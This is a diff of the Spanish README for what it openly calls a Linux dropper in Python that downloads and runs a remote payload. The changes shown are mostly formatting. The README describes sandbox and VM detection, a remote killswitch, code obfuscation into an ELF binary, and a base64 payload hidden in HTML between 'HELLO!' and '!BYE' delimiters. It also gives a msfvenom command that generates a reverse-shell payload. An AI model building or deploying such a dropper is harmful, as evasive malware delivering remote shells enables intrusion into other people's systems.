@@ -10,7 +10,8 @@ Dropper para Linux escrito en Python 3. Descarga y ejecuta un payload de forma d
 - **Builder** — script que inyecta la configuración, ofusca el código y genera un binario ELF nativo con PyInstaller.
 
 ## Estructura
-.
+
+```bash
 ├── dropper.py # Punto de entrada y flujo principal
 ├── killswitch.py # Comprobación del killswitch remoto
 ├── vm_detect.py # Detección de VM / cloud / QEMU
@@ -18,6 +19,7 @@ Dropper para Linux escrito en Python 3. Descarga y ejecuta un payload de forma d
 ├── builder # Script de compilación y ofuscación
 └── dist/
 └── dropper_bin # Binario generado (ejemplo)
+```
 
 ## Uso
 
@@ -74,7 +76,9 @@ Recorre `/proc` buscando procesos con nombre `qemu-guest-agent`. Si se detecta, 
 
 El módulo `payload.py` espera que la URL remota contenga el payload codificado en base64, delimitado por:
 
+```bash
 HELLO!:<base64>:!BYE
+```
 
 Todo el contenido fuera de esos delimitadores se ignora. Ejemplo válido embebido en HTML:
 
@@ -131,7 +135,7 @@ Generar un payload de prueba:
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | base64 -w0
 ```
 
-## URLs de configuración
+## URLs de configuración empleados para las pruebas
 
 | Recurso | URL |
 |---|---|
